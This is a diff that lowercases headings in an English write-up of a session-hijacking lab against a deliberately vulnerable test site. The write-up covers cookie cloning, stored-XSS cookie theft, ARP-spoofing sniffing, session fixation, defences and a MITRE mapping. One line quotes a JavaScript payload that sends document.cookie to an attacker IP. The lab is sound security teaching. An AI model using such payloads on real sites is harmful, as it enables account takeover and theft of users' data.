@@ -1,6 +1,6 @@
 > **English** | [Italiano](README.md)
 
-# Auth Attacks: Session Hijacking
+# Auth attacks: session hijacking
 
 > - **Phase:** Web Attack - Session Hijacking
 > - **Visibility:** Medium (XSS for cookie stealing) / High (ARP spoofing on LAN) / None (manual cookie cloning with physical access)
@@ -26,7 +26,7 @@ Tools: Browser DevTools, Python (HTTP Server), XSS Payload, Ettercap, Wireshark.
 
 ---
 
-## 1 Theory: The "Master Key"
+## 1 Theory: the "master key"
 
 The HTTP protocol is stateless (no memory). To "remember" who you are after login, the server assigns you a Session ID (usually saved in Cookies).
 In security terms: Whoever possesses that cookie IS the user.
@@ -35,7 +35,7 @@ If an attacker obtains it, they can access the victim's account immediately, wit
 
 ---
 
-## 2 Main Attack Vectors
+## 2 Main attack vectors
 
 - XSS (Cross-Site Scripting): Inject malicious JavaScript to read `document.cookie` and send it to an external server.
 - Network Sniffing: Intercept unencrypted HTTP traffic (e.g., on public Wi-Fi) to read cookies in transit.
@@ -44,19 +44,19 @@ If an attacker obtains it, they can access the victim's account immediately, wit
 
 ---
 
-## 3 Scenario A: Manual Cookie Cloning (Basic)
+## 3 Scenario a: manual cookie cloning (basic)
 
 In this scenario we simulate the basic concept: if I copy the cookie from one browser to another, I transfer the session.
 
 Procedure:
 
-#### Browser A (Victim): Performs legitimate login on `testphp.vulnweb.com`
+#### Browser a (victim): performs legitimate login on `testphp.vulnweb.com`
 
 Extraction: Opens DevTools (`F12` > Storage > Cookies) and copies the cookie value.
 
 Typical value: `login=test%2Ftest`
 
-#### Browser B (Attacker): Opens the site homepage (unauthenticated)
+#### Browser b (attacker): opens the site homepage (unauthenticated)
 
 Injection: Opens the Developer Console and types:
 
@@ -68,11 +68,11 @@ Refresh: Reloading the page, Browser B is logged in as the victim user.
 
 ---
 
-## 4 Scenario B: XSS to Cookie Stealing (Advanced Red Team)
+## 4 Scenario b: XSS to cookie stealing (advanced red team)
 
 In this real scenario, we automate the theft using a site vulnerability, without having physical access to the victim's PC.
 
-#### Phase 1: Trap Setup
+#### Phase 1: trap setup
 
 The attacker exploits a Stored XSS vulnerability in the Guestbook. The objective is to inject a script that sends the cookie to the attacker's server (`192.168.0.110`).
 
@@ -90,7 +90,7 @@ XSS Payload:
 
 Technical Note (Stealth): This payload uses a redirect (`document.location`), which is visible to the victim. A real attacker could use a silent method (e.g., `new Image().src = 'http://192.168.0.110:8000/?c='+document.cookie`) to steal the cookie in the background without the victim noticing.
 
-#### Phase 2: Execution (The Heist)
+#### Phase 2: execution (the heist)
 
 The victim visits the Guestbook page. The browser executes the script and is forced to visit the attacker's server, exposing the cookie in the URL.
 
@@ -100,7 +100,7 @@ The victim sees a "Directory listing" of the attacker's server instead of the si
 
 ![](./img/Screenshot_2026-02-14_23_50_43.jpg)
 
-#### Phase 3: Acquisition and Injection
+#### Phase 3: acquisition and injection
 
 The attacker receives the cookie in the Python server logs and injects it into their own browser via console.
 
@@ -110,7 +110,7 @@ Evidence 2: Kali Logs & Manual Injection
 
 On the left, server logs showing the GET request with the cookie. On the right, the attacker's browser console where the cookie is set.
 
-#### Phase 4: Impersonation (Success)
+#### Phase 4: impersonation (success)
 
 After setting the cookie and refreshing the page, the attacker has full access to the sensitive data (credit card, email) of user `test`.
 
@@ -120,7 +120,7 @@ Evidence 3: Access Executed
 
 ---
 
-## 5 Secure Coding (Defense)
+## 5 Secure coding (defense)
 
 To mitigate these attacks, action is needed on multiple levels:
 
@@ -146,7 +146,7 @@ To mitigate these attacks, action is needed on multiple levels:
 
 ---
 
-## 6 Scenario C: Network Sniffing (Man-in-the-Middle)
+## 6 Scenario c: network sniffing (Man-in-the-Middle)
 
 In this scenario, the attacker positions themselves within the same local network (LAN) as the victim. Since the target `testphp.vulnweb.com` uses the unencrypted HTTP protocol, all traffic, including session cookies, travels "in cleartext".
 
@@ -178,7 +178,7 @@ The only effective defense against sniffing is using HTTPS (TLS/SSL) and the `Se
 
 ---
 
-## 7 Scenario D: Session Fixation (Theoretical Trap)
+## 7 Scenario d: session fixation (theoretical trap)
 
 Unlike theft (Hijacking), here the attacker imposes a known Session ID on the victim before they log in.
 
@@ -204,15 +204,15 @@ The server must implement Session Rotation: every time a user changes privilege 
 
 ---
 
-## MITRE ATT&CK Mapping
+## MITRE ATT&CK mapping
 
-| Tactic | Technique | MITRE ID | Action Description |
+| tactic | technique | mitre id | action description |
 | :--- | :--- | :--- | :--- |
-| Credential Access | Steal Web Session Cookie | `T1539` | Theft of cookie `login=test%2Ftest` through Stored XSS payload in Guestbook (Scenario B) and through network interception (Scenario C) (WEB-010) |
-| Collection | Man-in-the-Middle: AiTM HTTPS Interception | `T1557.002` | ARP spoofing with Ettercap + HTTP packet capture with Wireshark to extract session cookie in cleartext (Scenario C - WEB-010) |
-| Defense Evasion | Use Alternate Authentication Material: Web Session Cookie | `T1550.004` | Injection of stolen cookie in attacker's browser via JavaScript console (`document.cookie = "..."`) to impersonate the victim's session (WEB-010) |
-| Initial Access | Exploit Public-Facing Application | `T1190` | Exploitation of missing `HttpOnly` flag on the session cookie, allowing access via JavaScript (WEB-010) |
-| Collection | Browser Session Hijacking | `T1185` | Impersonation of the victim's authenticated session after cookie injection, with access to sensitive profile data |
+| credential access | steal web session cookie | `T1539` | theft of cookie `login=test%2Ftest` through stored xss payload in guestbook (scenario b) and through network interception (scenario c) (WEB-010) |
+| collection | man-in-the-middle: aitm https interception | `T1557.002` | arp spoofing with ettercap + http packet capture with wireshark to extract session cookie in cleartext (scenario c - WEB-010) |
+| defense evasion | use alternate authentication material: web session cookie | `T1550.004` | injection of stolen cookie in attacker's browser via javascript console (`document.cookie = "..."`) to impersonate the victim's session (WEB-010) |
+| initial access | exploit public-facing application | `T1190` | exploitation of missing `HttpOnly` flag on the session cookie, allowing access via javascript (WEB-010) |
+| collection | browser session hijacking | `T1185` | impersonation of the victim's authenticated session after cookie injection, with access to sensitive profile data |
 
 ---
 
